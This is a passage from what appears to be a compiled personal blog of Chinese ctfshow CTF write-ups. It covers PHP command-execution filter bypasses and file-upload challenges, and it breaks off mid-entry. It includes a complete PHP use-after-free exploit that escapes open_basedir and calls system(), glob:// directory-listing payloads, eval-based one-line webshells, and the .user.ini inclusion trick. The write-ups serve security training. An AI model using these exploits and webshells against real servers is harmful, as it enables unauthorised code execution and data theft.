的方式类似于将脚本中的每一行指令逐条在当前shell中执行，因此它继承了当前shell的环境变量，同时脚本中对环境变量的修改也可以反馈到shell中）</p>\n</blockquote>\n<blockquote>\n<p>上传的文件会临时储存在一个地址下一般为/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。最后构造POC，执行任意命令</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530200618504" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006557.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530200629352" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006428.png" data="aurora"></p>\n<blockquote>\n<p>最后rce</p>\n</blockquote>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302007840.png" alt="image-20230530200713771"  />\n<h3 id="web56" tabindex="-1"><a class="header-anchor" href="#web56" aria-hidden="true">#</a> Web56</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002648.gif" data="aurora"></p>\n<blockquote>\n<p>比55多过滤了数字和$ 应该对文件上传影响不大 尝试用文件上传</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530200527722" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302005771.png" data="aurora"></p>\n<h3 id="web57" tabindex="-1"><a class="header-anchor" href="#web57" aria-hidden="true">#</a> Web57</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002650.gif" data="aurora"></p>\n<blockquote>\n<p>多过滤了. 和? 所以不能像上一题用文件上传</p>\n</blockquote>\n<blockquote>\n<p>这道题表达flag在36.php 而在system函数中也有cat和.php 只需要传参c=36就行了</p>\n</blockquote>\n<blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>在Linux shell中$(())是代表数学运算   ~代表取反    举个栗子：a=1,b=2\n$a+$b就等同于$((1+2))\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002659.gif" data="aurora"></p>\n<blockquote>\n<p>一个很奇怪的点 -1取反再输出是显示的0 要得到一就要在加一个$((~$(())))</p>\n</blockquote>\n<blockquote>\n<p>所以要输出36 需要37个</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>$((~$(())))\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002671.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002039.gif" data="aurora"></p>\n<h3 id="web58" tabindex="-1"><a class="header-anchor" href="#web58" aria-hidden="true">#</a> Web58</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002184.gif" data="aurora"></p>\n<blockquote>\n<p>只能一个一个试过去</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif)</p>\n<blockquote>\n<p>直接读文件</p>\n</blockquote>\n<h3 id="web59" tabindex="-1"><a class="header-anchor" href="#web59" aria-hidden="true">#</a> Web59</h3>\n<blockquote>\n<p>跟上题一样，啥也不知道</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image020.gif)</p>\n<blockquote>\n<p>还是直接读就读出来了</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif)</p>\n<h3 id="web60" tabindex="-1"><a class="header-anchor" href="#web60" aria-hidden="true">#</a> Web60</h3>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image024.gif)</p>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif)</p>\n<h3 id="web61-62" tabindex="-1"><a class="header-anchor" href="#web61-62" aria-hidden="true">#</a> Web61 62</h3>\n<blockquote>\n<p>还是和上一题一样的</p>\n</blockquote>\n<h3 id="web66" tabindex="-1"><a class="header-anchor" href="#web66" aria-hidden="true">#</a> Web66</h3>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image028.gif)</p>\n<blockquote>\n<p>查看目录</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image030.gif)</p>\n<blockquote>\n<p>Print_r和var_dump 作用差不多可以替换</p>\n</blockquote>\n<blockquote>\n<p>2.var_dump()和print_r()的区别</p>\n</blockquote>\n<blockquote>\n<p>共同点：两者都可以打印数组，对象之类的复合型变量。</p>\n</blockquote>\n<blockquote>\n<p>区别：print_r() 只能打印一些易于理解的信息，且print_r()在打印数组时，会将把数组的指针移到最后边，使用 reset() 可让指针回到开始处。 而var_dump()不但能打印复合类型的数据，还能打印资源类型的变量。且var_dump()输出的信息则比较详细，一般调试时用得多。</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image032.gif)</p>\n<h3 id="web67" tabindex="-1"><a class="header-anchor" href="#web67" aria-hidden="true">#</a> Web67</h3>\n<blockquote>\n<p>和上一题一样</p>\n</blockquote>\n<h3 id="web68" tabindex="-1"><a class="header-anchor" href="#web68" aria-hidden="true">#</a> Web68</h3>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif)</p>\n<blockquote>\n<p>常规查目录</p>\n</blockquote>\n<p>![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif)</p>\n<blockquote>\n<p>这次禁用了show_source 和highlingt_file</p>\n</blockquote>\n<blockquote>\n<p>用include![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif)</p>\n</blockquote>\n<blockquote>\n<p>然后就RCE</p>\n</blockquote>\n<h3 id="web70" tabindex="-1"><a class="header-anchor" href="#web70" aria-hidden="true">#</a> Web70</h3>\n<blockquote>\n<p>Var_dump print_r被禁 还可以使用var_export</p>\n</blockquote>\n<blockquote>\n<p>var_export() 函数用于输出或返回一个变量，以字符串形式表示。</p>\n</blockquote>\n<blockquote>\n<p>var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530202004081" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020137.png" data="aurora"></p>\n<blockquote>\n<p>还是一样include方法做</p>\n</blockquote>\n<h3 id="web71" tabindex="-1"><a class="header-anchor" href="#web71" aria-hidden="true">#</a> Web71</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530203443557" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302034605.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020667.gif" data="aurora"></p>\n<blockquote>\n<p><a href="https://blog.csdn.net/weixin_34214500/article/details/85920870?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&amp;utm_relevant_index=2" target="_blank" rel="noopener noreferrer">PHP详解ob_clean,ob_start和ob_get_contents函数<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>这道题是先将缓冲区的内容存在s变量中，然后执行清空缓冲区可以忽略前面所有输出，再通过替换输出s变量形成看到的题目。</p>\n</blockquote>\n<blockquote>\n<p>可以用exit（）直接终端进程</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530203500613" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302035672.png" data="aurora"></p>\n<h3 id="web72" tabindex="-1"><a class="header-anchor" href="#web72" aria-hidden="true">#</a> Web72<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020669.gif" data="aurora"></h3>\n<blockquote>\n<p>无权限  用glob伪协议遍历目录 (通用版)</p>\n</blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>c=$a="glob:///*.txt";\nif($b=opendir($a)){\n\twhile(($a=readdir($b))!==false){\n\techo "filename:".$a."\\n";\n}\nclosedir($b);\n}\nexit();\n或者\nc=?>&lt;?php $a=new DirectoryIterator("glob://./*");\nforeach($a as $f)\n{echo($f->__toString().\' \');\n}\nexit(0);\n?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><blockquote>\n<p>然后利用uaf漏洞来读取</p>\n</blockquote>\n<blockquote>\n<p>看了关于uaf漏洞的笔记：<a href="https://blog.csdn.net/musilintan/article/details/116309734?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&amp;utm_relevant_index=1" target="_blank" rel="noopener noreferrer">漏洞学习笔记——UAF漏洞_孤月丶星辰的博客-CSDN博客_uaf漏洞<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p>uaf绕过open_basedir执行命令\npoc（需要url编码）</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;?php\n\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\nclass Vuln {\n    public $a;\n    public function __destruct() { \n        global $backtrace; \n        unset($this->a);\n        $backtrace = (new Exception)->getTrace();\n        if(!isset($backtrace[1][\'args\'])) {\n            $backtrace = debug_backtrace();\n        }\n    }\n}\n\nclass Helper {\n    public $a, $b, $c, $d;\n}\n\nfunction str2ptr(&amp;$str, $p = 0, $s = 8) {\n    $address = 0;\n    for($j = $s-1; $j >= 0; $j--) {\n        $address &lt;&lt;= 8;\n        $address |= ord($str[$p+$j]);\n    }\n    return $address;\n}\n\nfunction ptr2str($ptr, $m = 8) {\n    $out = "";\n    for ($i=0; $i &lt; $m; $i++) {\n        $out .= sprintf("%c",($ptr &amp; 0xff));\n        $ptr >>= 8;\n    }\n    return $out;\n}\n\nfunction write(&amp;$str, $p, $v, $n = 8) {\n    $i = 0;\n    for($i = 0; $i &lt; $n; $i++) {\n        $str[$p + $i] = sprintf("%c",($v &amp; 0xff));\n        $v >>= 8;\n    }\n}\n\nfunction leak($addr, $p = 0, $s = 8) {\n    global $abc, $helper;\n    write($abc, 0x68, $addr + $p - 0x10);\n    $leak = strlen($helper->a);\n    if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }\n    return $leak;\n}\n\nfunction parse_elf($base) {\n    $e_type = leak($base, 0x10, 2);\n\n​    $e_phoff = leak($base, 0x20);\n​    $e_phentsize = leak($base, 0x36, 2);\n​    $e_phnum = leak($base, 0x38, 2);\n\n​    for($i = 0; $i &lt; $e_phnum; $i++) {\n​        $header = $base + $e_phoff + $i * $e_phentsize;\n​        $p_type  = leak($header, 0, 4);\n​        $p_flags = leak($header, 4, 4);\n​        $p_vaddr = leak($header, 0x10);\n​        $p_memsz = leak($header, 0x28);\n\n​        if($p_type == 1 &amp;&amp; $p_flags == 6) { \n\n​            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n​            $data_size = $p_memsz;\n​        } else if($p_type == 1 &amp;&amp; $p_flags == 5) { \n​            $text_size = $p_memsz;\n​        }\n​    }\n\n​    if(!$data_addr || !$text_size || !$data_size)\n​        return false;\n\n​    return [$data_addr, $text_size, $data_size];\n}\n\nfunction get_basic_funcs($base, $elf) {\n    list($data_addr, $text_size, $data_size) = $elf;\n    for($i = 0; $i &lt; $data_size / 8; $i++) {\n        $leak = leak($data_addr, $i * 8);\n        if($leak - $base > 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n            $deref = leak($leak);\n            \n            if($deref != 0x746e6174736e6f63)\n                continue;\n        } else continue;\n\n​        $leak = leak($data_addr, ($i + 4) * 8);\n​        if($leak - $base > 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n​            $deref = leak($leak);\n​            \n​            if($deref != 0x786568326e6962)\n​                continue;\n​        } else continue;\n\n​        return $data_addr + $i * 8;\n​    }\n}\n\nfunction get_binary_base($binary_leak) {\n    $base = 0;\n    $start = $binary_leak &amp; 0xfffffffffffff000;\n    for($i = 0; $i &lt; 0x1000; $i++) {\n        $addr = $start - 0x1000 * $i;\n        $leak = leak($addr, 0, 7);\n        if($leak == 0x10102464c457f) {\n            return $addr;\n        }\n    }\n}\n\nfunction get_system($basic_funcs) {\n    $addr = $basic_funcs;\n    do {\n        $f_entry = leak($addr);\n        $f_name = leak($f_entry, 0, 6);\n\n​        if($f_name == 0x6d6574737973) {\n​            return leak($addr + 8);\n​        }\n​        $addr += 0x20;\n​    } while($f_entry != 0);\n​    return false;\n}\n\nfunction trigger_uaf($arg) {\n\n​    $arg = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\n​    $vuln = new Vuln();\n​    $vuln->a = $arg;\n}\n\nif(stristr(PHP_OS, \'WIN\')) {\n    die(\'This PoC is for *nix systems only.\');\n}\n\n$n_alloc = 10; \n$contiguous = [];\nfor($i = 0; $i &lt; $n_alloc; $i++)\n    $contiguous[] = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\n\ntrigger_uaf(\'x\');\n$abc = $backtrace[1][\'args\'][0];\n\n$helper = new Helper;\n$helper->b = function ($x) { };\n\nif(strlen($abc) == 79 || strlen($abc) == 0) {\n    die("UAF failed");\n}\n\n$closure_handlers = str2ptr($abc, 0);\n$php_heap = str2ptr($abc, 0x58);\n$abc_addr = $php_heap - 0xc8;\n\nwrite($abc, 0x60, 2);\nwrite($abc, 0x70, 6);\n\nwrite($abc, 0x10, $abc_addr + 0x60);\nwrite($abc, 0x18, 0xa);\n\n$closure_obj = str2ptr($abc, 0x20);\n\n$binary_leak = leak($closure_handlers, 8);\nif(!($base = get_binary_base($binary_leak))) {\n    die("Couldn\'t determine binary base address");\n}\n\nif(!($elf = parse_elf($base))) {\n    die("Couldn\'t parse ELF header");\n}\n\nif(!($basic_funcs = get_basic_funcs($base, $elf))) {\n    die("Couldn\'t get basic_functions address");\n}\n\nif(!($zif_system = get_system($basic_funcs))) {\n    die("Couldn\'t get zif_system address");\n}\n\n$fake_obj_offset = 0xd0;\nfor($i = 0; $i &lt; 0x110; $i += 8) {\n    write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n}\n\nwrite($abc, 0x20, $abc_addr + $fake_obj_offset);\nwrite($abc, 0xd0 + 0x38, 1, 4); \nwrite($abc, 0xd0 + 0x68, $zif_system); \n\n($helper->b)($cmd);\nexit();\n\n}\n\nctfshow("cat /flag0.txt");ob_end_flush();\n?>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br><span class="line-number">132</span><br><span class="line-number">133</span><br><span class="line-number">134</span><br><span class="line-number">135</span><br><span class="line-number">136</span><br><span class="line-number">137</span><br><span class="line-number">138</span><br><span class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br><span class="line-number">163</span><br><span class="line-number">164</span><br><span class="line-number">165</span><br><span class="line-number">166</span><br><span class="line-number">167</span><br><span class="line-number">168</span><br><span class="line-number">169</span><br><span class="line-number">170</span><br><span class="line-number">171</span><br><span class="line-number">172</span><br><span class="line-number">173</span><br><span class="line-number">174</span><br><span class="line-number">175</span><br><span class="line-number">176</span><br><span class="line-number">177</span><br><span class="line-number">178</span><br><span class="line-number">179</span><br><span class="line-number">180</span><br><span class="line-number">181</span><br><span class="line-number">182</span><br><span class="line-number">183</span><br><span class="line-number">184</span><br><span class="line-number">185</span><br><span class="line-number">186</span><br><span class="line-number">187</span><br><span class="line-number">188</span><br><span class="line-number">189</span><br><span class="line-number">190</span><br><span class="line-number">191</span><br><span class="line-number">192</span><br><span class="line-number">193</span><br><span class="line-number">194</span><br><span class="line-number">195</span><br><span class="line-number">196</span><br><span class="line-number">197</span><br><span class="line-number">198</span><br><span class="line-number">199</span><br><span class="line-number">200</span><br><span class="line-number">201</span><br><span class="line-number">202</span><br><span class="line-number">203</span><br><span class="line-number">204</span><br></div></div></blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020682.gif" data="aurora"></p>\n<h3 id="web73" tabindex="-1"><a class="header-anchor" href="#web73" aria-hidden="true">#</a> Web73</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020884.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020022.gif" data="aurora"></p>\n<blockquote>\n<p>还是glob遍历</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020067.gif" data="aurora"></p>\n<p>用上脚本发现strlen被ban了</p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020097.gif" data="aurora"></p>\n<blockquote>\n<p>看其他师傅的wp include是没有被ban掉的 做题定向思维了 这应该是非预期解了</p>\n</blockquote>\n<h3 id="web74" tabindex="-1"><a class="header-anchor" href="#web74" aria-hidden="true">#</a> Web74</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020282.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020339.gif" data="aurora"></p>\n<blockquote>\n<p>和上一题一样</p>\n</blockquote>\n<h3 id="web75" tabindex="-1"><a class="header-anchor" href="#web75" aria-hidden="true">#</a> Web75</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020432.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020507.gif" data="aurora"></p>\n<blockquote>\n<p>这道题是用了pdo连接mysql操作方法 不是特别明白 先跳过</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web1.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web1",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web1.md",filePathRelative:"web/web1.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web1.html.vue",componentFilePathRelative:"pages/web/web1.html.vue",componentFileChunkName:"v-d8e4d770",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web1.html.js",dataFilePathRelative:"pages/web/web1.html.js",dataFileChunkName:"v-d8e4d770",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web1.html",htmlFilePathRelative:"web/web1.html"},{data:{key:"v-d57b2632",path:"/web/web2.html",title:"文件上传刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"文件上传刷题",tag:["ctfshow刷题"],categories:["文件上传","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件上传",slug:"文件上传",children:[]},{level:2,title:"Web151",slug:"web151",children:[{level:3,title:"Web152",slug:"web152",children:[]},{level:3,title:"Web153",slug:"web153",children:[]},{level:3,title:"Web154",slug:"web154",children:[]},{level:3,title:"Web155",slug:"web155",children:[]},{level:3,title:"web156",slug:"web156",children:[]},{level:3,title:"web157",slug:"web157",children:[]},{level:3,title:"web158",slug:"web158",children:[]},{level:3,title:"web159",slug:"web159",children:[]},{level:3,title:"web160",slug:"web160",children:[]}]}],git:{}},key:"v-d57b2632",path:"/web/web2.html",title:"文件上传刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"文件上传刷题",tag:["ctfshow刷题"],categories:["文件上传","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件上传",slug:"文件上传",children:[]},{level:2,title:"Web151",slug:"web151",children:[{level:3,title:"Web152",slug:"web152",children:[]},{level:3,title:"Web153",slug:"web153",children:[]},{level:3,title:"Web154",slug:"web154",children:[]},{level:3,title:"Web155",slug:"web155",children:[]},{level:3,title:"web156",slug:"web156",children:[]},{level:3,title:"web157",slug:"web157",children:[]},{level:3,title:"web158",slug:"web158",children:[]},{level:3,title:"web159",slug:"web159",children:[]},{level:3,title:"web160",slug:"web160",children:[]}]}],content:'\r\n## 文件上传\r\n\r\n## Web151\r\n\r\n> （前端验证）\r\n\r\n![image1](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png)\r\n\r\n> 在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了\r\n>\r\n> 上传一个小马就能rce\r\n\r\n### Web152\r\n\r\n> (后端验证）\r\n\r\n![image3](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png)\r\n\r\n![image4](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png)\r\n\r\n> 更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。\r\n>\r\n> [Content-Type 详解_](https://blog.csdn.net/qq_14869093/article/details/86307084)\r\n>\r\n> 抓包后修改content-type 再发包就能绕过后端过滤\r\n\r\n![image5](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png)\r\n\r\n### Web153\r\n\r\n> ini文件包含绕过\r\n\r\n![image5](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png)\r\n\r\n> upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini[.user.ini漏洞](https://blog.csdn.net/weixin_52635170/article/details/126962920)\r\n\r\n> .user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。\r\n\r\n> 利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。\r\n\r\n![image8](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png)\r\n\r\n![image9](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png)\r\n\r\n> 这样index.php就包含了1.txt的马然后rce\r\n\r\n![image10](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png)\r\n\r\n> 也可以用日志文件包含做\r\n\r\n### Web154\r\n\r\n![image11](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png)\r\n\r\n> 过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签\r\n\r\n> ```\r\n> <?=eval($_POST[1]);？> <?PHP eval($_POST[1]);？>\r\n> ```\r\n>\r\n> \r\n\r\n> 没限制就继续用.user.ini漏洞写入包含文件\r\n\r\n### Web155\r\n\r\n> 同上\r\n\r\n### web156\r\n\r\n> 过滤了[]，用{}代替即可:\r\n>\r\n> ```\r\n> <?=eval($_POST{cmd});?>\r\n> ```\r\n\r\n### web157\r\n\r\n> 